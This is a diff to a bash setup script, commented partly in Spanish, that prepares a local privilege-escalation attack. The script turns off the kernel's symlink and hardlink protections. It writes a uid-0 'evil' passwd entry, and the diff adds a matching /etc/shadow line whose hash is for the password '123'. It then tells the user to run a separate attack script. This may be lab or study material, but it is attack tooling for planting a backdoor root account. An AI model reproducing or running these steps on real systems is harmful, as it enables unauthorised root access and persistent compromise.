@@ -67,8 +67,6 @@ fi
 echo "[+] Disabling protected_symlinks..."
 sudo sysctl -w fs.protected_symlinks=0
 sudo sysctl -w fs.protected_hardlinks=0
-sudo sysctl -w fs.protected_hardlinks=0
-
 # Verificar protecciones del sistema
 echo "[+] Checking system protections..."
 SYMLINK_PROTECTION=$(sysctl -n fs.protected_symlinks 2>/dev/null || echo "unknown")
@@ -89,3 +87,7 @@ echo "[+] Creating evil_input.txt entry ..."
 printf "evil:x:0:0:Evil_User:/root:/bin/bash\n" > evil_input.txt
 
 echo "[+] All Setting up Now you can run the script_1_attack..."
+# Crear entrada para /etc/shadow con contraseña "123"
+# Generado con: mkpasswd -m sha-512 123
+echo "[+] Creating evil_input_shadow.txt entry ..."
+echo 'evil:$6$rounds=656000$LHK0rUuzpTIaa0tz$N8XkkCT3L1S8hJleZYVFKyzv0ErFfQ2iMzSpbaYQbcDKcY0oQ1xV1N8Q43JjfwGFf3kXFeuBOg9MRGk/8CRh6.:19000:0:99999:7:::' > evil_input_shadow.txt
